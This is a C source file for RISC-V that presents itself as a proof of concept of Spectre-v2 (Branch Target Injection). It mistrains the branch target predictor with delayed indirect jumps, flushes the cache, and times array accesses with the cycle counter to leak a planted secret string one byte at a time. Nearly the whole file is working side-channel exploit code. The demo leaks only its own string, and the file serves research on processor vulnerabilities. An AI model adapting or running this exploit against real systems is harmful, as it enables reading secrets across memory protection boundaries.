#include <stdio.h>
#include <stdint.h>
#include "cache.h"

/**
 * 宏定义读寄存器操作
 * 读取特殊状态寄存器中记录的时间戳
 */
#define read_csr(reg) ({ unsigned long __tmp; \
  asm volatile ("csrr %0, " #reg : "=r"(__tmp)); \
  __tmp; })
#define rdcycle() read_csr(cycle) 

#define TRAIN_TIMES         6 // assumption is that you have a 2 bit counter in the predictor
#define ROUNDS              1 // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS  10 // amount of times to attack the same index
#define SECRET_SZ           26
#define CACHE_HIT_THRESHOLD 30

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "Zhou zhe shi da shuai ge!!";

void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray) {
    outValArray[0] = 0; outValArray[1] = 0;
    for (uint64_t i = 0; i < inArraySize; ++i) {
        if (inArray[i] > outValArray[0]) {
            outValArray[1] = outValArray[0]; outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0]; outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]) {
            outValArray[1] = inArray[i]; outIdxArray[1] = i;
        }
    }
}

void wantFunc() { asm("nop"); }

void victimFunc(uint64_t idx) { uint8_t dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES]; }

int main(void) {
    uint64_t wantAddr   = (uint64_t)(&wantFunc); 
    uint64_t victimAddr = (uint64_t)(&victimFunc);
    uint64_t start, diff, passInAddr;
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t passInIdx, randIdx;
    uint8_t dummy = 0;
    static uint64_t results[256];

    printf("This is a POC of Spectre-v2 (Branch Target Injection)\n");
    printf("the secret key is:%s \n", secretString);

    for(uint64_t len = 0; len < SECRET_SZ; ++len) {
        for(uint64_t i = 0; i < 256; ++i) results[i] = 0;
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) { 
            flushCache((uint64_t)array2, sizeof(array2));

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {
                passInAddr = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInAddr=...FFFF0000 else 0
                passInAddr = (passInAddr | (passInAddr >> 16)); // set the passInAddr = -1 or 0
                passInAddr = victimAddr ^ (passInAddr & (wantAddr ^ victimAddr)); // select victimAddr or wantAddr 
                randIdx    = atkRound % array1_sz;
                passInIdx  = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx  = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx  = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
                // printf("len=[%lu], atkRound=[%lu], passInAddr=[%s], passInIdx=[%lu]\n", len, atkRound, passInAddr, passInIdx);
                for(uint64_t k = 0; k < 30; ++k) asm(""); // set of constant takens to make the BHR be in a all taken state
                // this calls the function using jalr and delays the addr passed in through fdiv
                asm("addi %[addr], %[addr], -2\n"
                    "addi t1, zero, 2\n"
                    "slli t2, t1, 0x4\n"
                    "fcvt.s.lu fa4, t1\n"
                    "fcvt.s.lu fa5, t2\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fdiv.s	fa5, fa5, fa4\n"
                    "fcvt.lu.s	t2, fa5, rtz\n"
                    "add %[addr], %[addr], t2\n"
                    "mv a0, %[arg]\n"
                    "jalr ra, %[addr], 0\n"
                    :
                    : [addr] "r" (passInAddr), [arg] "r" (passInIdx)
                    : "t1", "t2", "fa4", "fa5");
            }
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for(uint64_t i = 0; i < 256; ++i) {
                start = rdcycle();
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);
                // printf("[%c,%ld]\n", i, diff);
                if (diff < CACHE_HIT_THRESHOLD) results[i] += 1;
            }
        }
        // get highest and second highest result hit values
        uint8_t output[2] = {0, 0};
        uint64_t hitArray[2] = {0, 0};
        topTwoIdx(results, 256, output, hitArray);

        if(output[0] == (int)secretString[len] || output[1] == (int)secretString[len]) 
        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
                                                           hitArray[1], output[1], output[1]); 
        else 
        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
                                                           hitArray[1], output[1], output[1]);  

        // read in the next secret 
        ++attackIdx;
    }
    return 0;
}
